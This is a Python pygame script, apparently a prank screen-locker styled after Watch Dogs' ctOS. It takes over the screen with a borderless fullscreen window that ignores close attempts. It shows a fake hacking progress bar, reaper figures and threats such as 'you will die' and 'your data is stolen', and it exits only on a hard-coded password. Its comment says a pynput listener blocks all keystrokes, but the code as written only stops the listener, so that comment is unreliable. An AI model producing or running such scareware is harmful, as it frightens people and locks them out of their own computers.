import pygame
import random
import sys
import time
import webbrowser
import threading
from pynput import keyboard

# === НАСТРОЙКИ ===
PASSWORD = "1601"
TEST_TIMER = 15  # секунд для теста (потом заменим на 600)
MUSIC_URL = "https://ost-watch-dogs-2.skysound7.com/t/06067162842068930321-ost-watch-dogs-2-main-menu-theme/"

# === ГЛОБАЛЬНАЯ БЛОКИРОВКА ===
block_keys = True

def on_press(key):
    """Перехватывает ВСЕ нажатия клавиш на уровне системы."""
    global block_keys
    if not block_keys:
        return True
    # Блокируем ВООБЩЕ ВСЁ
    return False

def on_release(key):
    global block_keys
    if not block_keys:
        return True
    return False

# Запускаем системный перехватчик
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

# === ФУНКЦИЯ ДЛЯ ЗАПУСКА МУЗЫКИ ===
def play_music():
    try:
        webbrowser.open(MUSIC_URL)
    except:
        pass

# === ИНИЦИАЛИЗАЦИЯ Pygame ===
pygame.init()
infoObject = pygame.display.Info()
W, H = infoObject.current_w, infoObject.current_h

# Создаём окно поверх всех окон (включая панель задач)
screen = pygame.display.set_mode((W, H), pygame.NOFRAME)
pygame.display.set_caption("CTOS 2.0")
clock = pygame.time.Clock()

# Шрифты
font_big = pygame.font.Font(None, 120)
font_mid = pygame.font.Font(None, 70)
font_small = pygame.font.Font(None, 40)

# === ЦВЕТА ===
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
RED = (255, 0, 0)

# Список страшных надписей
scary_texts = [
    "ТЫ УМРЁШЬ",
    "СИСТЕМА ЗАБЛОКИРОВАНА",
    "НЕТ ВЫХОДА",
    "ЗА ТОБОЙ СЛЕДЯТ",
    "ТВОИ ДАННЫЕ УКРАДЕНЫ",
    "ПРОЩАЙ",
]

def draw_reaper(surf, x, y, frame):
    """Рисует статую Смерти с косой."""
    # Капюшон
    pygame.draw.ellipse(surf, RED, (x-30, y-60, 60, 70), 3)
    pygame.draw.polygon(surf, RED, [(x-35, y-30), (x, y-50), (x+35, y-30)], 3)
    # Глаза
    if frame % 20 < 10:
        pygame.draw.circle(surf, RED, (x-10, y-20), 6)
        pygame.draw.circle(surf, RED, (x+10, y-20), 6)
    else:
        pygame.draw.line(surf, RED, (x-12, y-20), (x-8, y-20), 3)
        pygame.draw.line(surf, RED, (x+8, y-20), (x+12, y-20), 3)
    # Тело
    pygame.draw.line(surf, RED, (x, y), (x, y+80), 3)
    # Коса
    angle = frame * 0.05
    end_x = x + int(60 * pygame.math.Vector2(1, 0).rotate(angle)[0])
    end_y = y + int(60 * pygame.math.Vector2(1, 0).rotate(angle)[1])
    pygame.draw.line(surf, RED, (x, y-30), (end_x, end_y), 3)

def draw_fake_hack(surf, percent):
    """Рисует фейковую строку загрузки."""
    text = font_mid.render(f"Взлом ctOS 2.0: {percent}%", True, RED)
    surf.blit(text, (50, 50))
    bar_width = int((percent / 100) * (W - 200))
    pygame.draw.rect(surf, RED, (50, 120, bar_width, 30), 3)
    for i in range(0, bar_width, 15):
        pygame.draw.rect(surf, RED, (55 + i, 125, 10, 20))

def draw_scary_text(surf, frame):
    """Рисует страшную надпись в центре."""
    text = scary_texts[frame % len(scary_texts)]
    text_surface = font_big.render(text, True, RED)
    surf.blit(text_surface, (W//2 - text_surface.get_width()//2, H//2 + 200))

# === ЗАПУСК МУЗЫКИ ===
threading.Thread(target=play_music, daemon=True).start()

# === ТАЙМЕР ОЖИДАНИЯ (15 СЕКУНД) ===
start_time = time.time()
while time.time() - start_time < TEST_TIMER:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pass  # Игнорируем любые попытки закрыть окно
    
    screen.fill(BLACK)
    elapsed = time.time() - start_time
    percent = min(100, int((elapsed / TEST_TIMER) * 100))
    draw_fake_hack(screen, percent)
    
    # Две статуи Смерти по бокам
    draw_reaper(screen, 100, H//2, int(elapsed * 10))
    draw_reaper(screen, W-100, H//2, int(elapsed * 10 + 5))
    
    # Страшная надпись
    draw_scary_text(screen, int(elapsed * 2))
    
    # Рисуем летающие частицы
    for _ in range(100):
        x = random.randint(0, W)
        y = random.randint(0, H)
        pygame.draw.circle(screen, RED, (x, y), 3)
    
    pygame.display.flip()
    clock.tick(30)

# === ОКНО БЛОКИРОВКИ ===
input_box = pygame.Rect(W//2 - 150, H//2 + 100, 300, 50)
text_input = ""

while True:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            pass
        if event.type == pygame.KEYDOWN:
            if event.key == pygame.K_RETURN:
                if text_input == PASSWORD:
                    pygame.quit()
                    sys.exit()
                else:
                    text_input = ""
            elif event.key == pygame.K_BACKSPACE:
                text_input = text_input[:-1]
            elif event.unicode.isprintable():
                text_input += event.unicode
    
    screen.fill(BLACK)
    
    # Смерть над полем ввода
    draw_reaper(screen, W//2, H//2 - 150, int(time.time() * 15) % 30)
    
    # Страшная надпись
    draw_scary_text(screen, int(time.time() * 2) % len(scary_texts))
    
    prompt = font_mid.render("Введите пароль:", True, RED)
    screen.blit(prompt, (W//2 - 200, H//2))
    
    pygame.draw.rect(screen, RED, input_box, 3)
    text_surface = font_small.render(text_input, True, RED)
    screen.blit(text_surface, (input_box.x + 10, input_box.y + 10))
    
    pygame.display.flip()
    clock.tick(30)
